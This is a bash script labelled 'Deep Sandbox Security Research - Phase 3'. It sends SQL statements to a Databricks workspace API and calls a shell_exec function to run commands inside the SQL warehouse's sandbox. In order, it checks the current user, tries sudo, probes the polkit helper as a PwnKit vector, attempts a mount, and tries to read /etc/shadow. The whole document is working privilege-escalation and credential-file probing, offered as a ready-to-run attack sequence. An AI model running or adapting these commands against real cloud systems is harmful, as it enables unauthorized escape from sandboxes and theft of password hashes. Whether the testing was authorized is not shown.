#!/bin/bash

TOKEN="REDACTED_DATABRICKS_TOKEN"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="d8637cca1dc66ba3"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"30s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║          DEEP SANDBOX SECURITY RESEARCH - Phase 3             ║"
echo "║                    SUID & Privilege Tests                      ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

echo "═══ [1/6] CHECK CURRENT UID/GID ═══"
exec_sql "SELECT workspace.default.shell_exec('id')"
echo ""

echo "═══ [2/6] TRY TO EXECUTE SUDO ═══"
exec_sql "SELECT workspace.default.shell_exec('sudo -n whoami 2>&1 || echo \"[sudo blocked]\"')"
echo ""

echo "═══ [3/6] TRY POLKIT HELPER (PwnKit vector) ═══"
exec_sql "SELECT workspace.default.shell_exec('ls -la /usr/lib/polkit-1/polkit-agent-helper-1')"
exec_sql "SELECT workspace.default.shell_exec('/usr/lib/polkit-1/polkit-agent-helper-1 2>&1 | head -5 || echo \"[blocked]\"')"
echo ""

echo "═══ [4/6] TRY MOUNT (requires CAP_SYS_ADMIN) ═══"
exec_sql "SELECT workspace.default.shell_exec('mount -t proc none /tmp/test 2>&1 || echo \"[mount blocked]\"')"
echo ""

echo "═══ [5/6] CHECK /etc/passwd & /etc/shadow PERMISSIONS ═══"
exec_sql "SELECT workspace.default.shell_exec('ls -la /etc/passwd /etc/shadow 2>&1')"
echo ""

echo "═══ [6/6] TRY TO READ /etc/shadow ═══"
exec_sql "SELECT workspace.default.shell_exec('cat /etc/shadow 2>&1 | head -3 || echo \"[cannot read]\"')"
echo ""

echo "═══ PHASE 3 COMPLETE ═══"

